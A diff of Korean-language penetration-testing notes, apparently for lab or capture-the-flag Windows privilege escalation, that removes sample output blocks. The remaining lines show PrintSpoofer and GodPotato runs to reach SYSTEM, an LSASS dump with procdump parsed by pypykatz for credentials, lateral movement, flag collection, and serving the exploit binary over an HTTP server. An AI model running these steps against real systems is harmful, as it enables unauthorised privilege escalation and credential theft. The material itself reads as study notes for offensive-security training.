@@ -8,10 +8,6 @@
 C:\temp\PrintSpoofer64.exe -i -c "whoami"
 ```
 
-```text
-nt authority\system
-```
-
 - 플래그 수집
 
 ```powershell
@@ -25,18 +21,9 @@ dir C:\Users\*\Desktop\local.txt C:\Users\*\Desktop\proof.txt
 C:\temp\GodPotato-NET4.exe -cmd "cmd /c whoami"
 ```
 
-```text
-nt authority\system
-```
-
 ### 시나리오 C: 로컬 관리자 쉘 → SeDebugPrivilege 발견
 
 - 01 문서 순서대로 `procdump -ma lsass.exe` → Kali에서 `pypykatz`로 자격 증명 추출
-
-```text
-Dump complete: 1 dump file written.
-username: Administrator / nthash REDACTED
-```
 
 - 같은 패스워드 재사용 여부 확인 후 측면 이동
 
@@ -59,11 +46,6 @@ username: Administrator / nthash REDACTED
 
 ```bash
 python3 -m http.server 8000
-```
-
-```text
-Serving HTTP on 0.0.0.0 port 8000 ...
-"GET /PrintSpoofer64.exe HTTP/1.1" 200 -
 ```
 
 ### 타겟 전송: `certutil` 방식 (출력으로 성공 확인 가능)
